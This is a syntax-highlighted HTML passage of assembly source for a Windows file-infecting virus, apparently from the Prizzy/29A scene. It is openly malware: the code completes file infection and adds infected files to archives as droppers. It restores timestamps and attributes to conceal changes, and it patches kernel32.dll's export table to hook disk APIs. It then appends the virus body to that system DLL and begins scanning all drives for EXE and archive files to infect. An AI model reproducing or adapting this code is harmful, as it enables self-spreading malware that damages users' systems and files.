        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_infected</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; use for acrhive dropper ?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dta.dta_filesize</span><span class="sc4">],</span><span class="sc2">30000</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">infect_file_unMap</span><span class="sc0">   </span><span class="sc1">;for archive fsize &lt; 30Kb</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_hmem</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;mapped file in memory</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddUnmapViewOfFile</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_hmap</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;mapped file object</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddCloseHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_handle</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;I must close infected file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyCloseFile</span><span class="sc0">       </span><span class="sc1">;coz I'll copy it, etcetera</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__add_dropper</span><span class="sc0">       </span><span class="sc1">;compress it by ZIP, RAR ...</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">infect_file_restattr</span><span class="sc0">

    </span><span class="sc5">infect_file_unMap</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_hmem</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;mapped file in memory</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddUnmapViewOfFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">infect_file_closeMap</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_hmap</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;mapped file object</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddCloseHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">infect_file_time</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dta.dta_time_lastwrite</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dta.dta_time_lastaccess</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dta.dta_time_creation</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddSetFileTime</span><span class="sc4">],</span><span class="sc0"> \
            </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_handle</span><span class="sc4">],</span><span class="sc0"> \
            </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">infect_file_close</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_handle</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;close file handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyCloseFile</span><span class="sc0">
    </span><span class="sc5">infect_file_restattr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dta.dta_fileattr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;restore file attributes</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MySetAttrFile</span><span class="sc0">

    </span><span class="sc5">infect_file_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">                </span><span class="sc1">;go to HyperInfection or to</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">;Kernel32 hooked functions</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Common file infected semi-functions.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">__getLastObjectTable</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">NT_FileHeader.FH_NumberOfSections</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cdq</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;eax=offs of last section</span><span class="sc0">

        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">NT_FileHeader.FH_SizeOfOptionalHeader</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NT_OptionalHeader.OH_Magic</span><span class="sc0"> </span><span class="sc1">;seek to l.o. table</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to hook some funtions from KERNEL32.DLL ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;At last I've finished this unpalatable function. I remem-</span><span class="sc0">
        </span><span class="sc1">;ber how hardly I have  found an  interesting source about</span><span class="sc0">
        </span><span class="sc1">;this method because I have many many  problems with this.</span><span class="sc0">
        </span><span class="sc1">;So, let's begin. At first I will get these addresses:</span><span class="sc0">
        </span><span class="sc1">;   * name table pointer (as are function names)</span><span class="sc0">
        </span><span class="sc1">;   * address table pointer (as are functions addresses)</span><span class="sc0">
        </span><span class="sc1">;   * ordinal table pointer</span><span class="sc0">
        </span><span class="sc1">;Then I'll get function name, calculate its CRC32 and I'll</span><span class="sc0">
        </span><span class="sc1">;compare it  with my future-hooked CRC32  table. If I will</span><span class="sc0">
        </span><span class="sc1">;find it, i will save its original address,  replace by my</span><span class="sc0">
        </span><span class="sc1">;my new offset and I'll write it to the file.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;I would like to thank:</span><span class="sc0">
        </span><span class="sc1">;   * "Memory Lapse" for his "Win32.Heretic" source</span><span class="sc0">
        </span><span class="sc1">;   * Darkman/29A for giving me that source</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;I must infect "kernel32.dll" because I must hook all disk</span><span class="sc0">
        </span><span class="sc1">;functions because of "Prizzy Hyper Infection for API".</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">infect_file_kernel</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; save all registers</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc1">; check address of APIs in KERNEL32 file body</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_hmem</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">eax.MZ_lfanew</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;go to new "PE" header</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.OH_DirectoryEntries</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> \
                </span><span class="sc5">IMAGE_SIZEOF_FILE_HEADER</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> \
                </span><span class="sc2">00000004h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;get Export Directory Table</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_hmem</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">eax.ED_AddressOfOrdinals</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">eax.ED_AddressOfNames</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">eax.ED_AddressOfFunctions</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">eax.ED_BaseOrdinal</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;save BaseOrdinal</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">eax.ED_BaseOrdinal</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_hmem</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;adjust ordinal table pointer</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_hmem</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;adjust name table pointer</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_hmem</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;adjust address table pointer</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">     </span><span class="sc1">;save startup values</span><span class="sc0">

        </span><span class="sc1">; main loop</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Hooked_API</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000001h</span><span class="sc0">
    </span><span class="sc5">__ifk_next_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;address table pointer</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;save counter</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">         </span><span class="sc1">;convert to word index</span><span class="sc0">

        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;calculate ordinal index</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">00000014h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;relative to ordinal basee</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">         </span><span class="sc1">;convert to dword index</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">00000010h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;address pointer table</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;calculate offset</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;RVA of API</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;address name table</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;get pointer from name table</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_hmem</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__get_CRC32</span><span class="sc0">     </span><span class="sc1">;get CRC32 for function name</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;compare CRC32</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ifk_not_found</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;load original function addr</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Hooked_API</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">         </span><span class="sc1">;so, (x/2)*8</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Hooked_API_functions</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;get address into "jmp ????"</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">         </span><span class="sc1">;ehm, adjust that address</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;load original address</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel_base</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">       </span><span class="sc1">;save original func. address</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">00000004h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;load new address in v.body</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">       </span><span class="sc1">;next CRC32 function value</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc0">  </span><span class="sc1">; - "offset"</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dta.dta_filesize</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;new func. pos in "k32"</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; for next loop I must restart these values</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">00000008h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;load ordinal table pointer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">0000000Ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;load name table pointer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">00000010h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;load address table pointer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0"> </span><span class="sc1">;reset counter</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">00000004h</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">;reset address table pointer</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ifk_no_change</span><span class="sc0">     </span><span class="sc1">;this was fucking bug !</span><span class="sc0">

    </span><span class="sc5">__ifk_not_found</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">       </span><span class="sc1">;next name pointer</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> \  </span><span class="sc1">;next function pointer</span><span class="sc0">
            </span><span class="sc2">00000004h</span><span class="sc4">],</span><span class="sc2">00000004h</span><span class="sc0">
    </span><span class="sc5">__ifk_no_change</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;functions counter</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;next function</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;address table pointer</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0"> </span><span class="sc1">;end of hooked functions ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ifk_next_loop</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">it_is_kernel</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HyperInfection_k32</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">

        </span><span class="sc1">; write this virus body to the end of "kernel32.dll"</span><span class="sc0">
        </span><span class="sc1">; virus body cannot be encrypted...</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;start of virus body</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_address</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;allocated memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">mem_size</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">it_is_kernel</span><span class="sc4">],</span><span class="sc2">00000001h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">mem_size</span><span class="sc0">        </span><span class="sc1">;without poly-engine !!!</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_finish</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">;complex way how to go back</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ main function of infect all filez on disks ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function searchs these extensions on all disks:</span><span class="sc0">
        </span><span class="sc1">;   EXE, ZIP, ARJ, RAR, ACE, CAB, ...</span><span class="sc0">
        </span><span class="sc1">;and many namez, find "HyperTable" struct  for  more info.</span><span class="sc0">
        </span><span class="sc1">;If you want to know more  about this method,  open "Hyper</span><span class="sc0">
        </span><span class="sc1">;Infection" article in 29A #4, or download one from my web</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;Note:  * This is version for API, for IDT orientation use</span><span class="sc0">
        </span><span class="sc1">;     code from "Win95.Prizzy", thanks.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">init_search</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_base_ebp</span><span class="sc0">        </span><span class="sc1">;where we're into ebp</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_table</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;position in HyperTable</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_start</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__continue</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_start</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_disks</span><span class="sc0">       </span><span class="sc1">;get drive parameters</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">time</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddGetSystemTime</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;get actual time</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">search_mem_size</span><span class="sc0"> </span><span class="sc1">;size of mem for searching</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
